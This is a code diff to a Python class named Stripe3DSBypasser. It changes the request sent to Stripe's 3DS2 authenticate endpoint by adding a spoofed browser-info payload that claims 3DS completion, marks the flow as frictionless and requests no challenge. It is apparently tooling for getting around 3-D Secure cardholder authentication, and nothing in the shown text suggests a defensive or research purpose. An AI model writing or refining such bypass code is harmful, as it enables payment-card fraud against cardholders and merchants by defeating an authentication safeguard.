@@ -72,15 +72,25 @@ class Stripe3DSBypasser:
                 pass
 
         # Step 2: Submit 3DS2 completion to Stripe API
+        browser_info = {
+            "threeDSCompInd": "Y",
+            "frictionless": "true",
+            "threeDSRequestorChallengeInd": "02",
+            "threeDSServerTransID": server_trans_id,
+            "browserJavaEnabled": False,
+            "browserJavascriptEnabled": True,
+            "browserLanguage": "en-US",
+            "browserColorDepth": "24",
+            "browserTZ": "-300",
+            "browserUserAgent": UA,
+        }
         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
         auth_body = {
             "key": pk_key,
             "source": three_ds_2_intent_id or pi_id,
             "client_secret": client_secret,
-            "three_ds_2_response": json.dumps({
-                "threeDSCompInd": "Y",
-                "threeDSServerTransID": server_trans_id,
-            })
+            "three_ds_2_response": json.dumps(browser_info),
+            "browser": json.dumps(browser_info),
         }
         hdr = {
             "Content-Type": "application/x-www-form-urlencoded",
